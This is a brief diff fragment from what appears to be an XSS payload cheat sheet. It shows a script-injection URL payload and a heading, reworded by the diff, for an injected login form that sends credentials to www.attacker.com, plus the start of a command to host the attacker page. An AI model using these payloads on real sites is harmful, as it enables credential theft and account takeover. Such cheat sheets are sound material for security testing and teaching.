@@ -39,7 +39,7 @@ http://xxx.xxx.xxx.xxx/xss/example9.php#<script>alert(123)</script>
 ```
 
 
-Submits credentials to the www.attacker.com (Embeds Login Screen inside application)
+Submits credentials to the www.attacker.com, technically this is HTML Injection (Embeds Login Screen inside application)
 -----------------------
 ```
 # php -S xxx.xxx.xxx.xxx:80
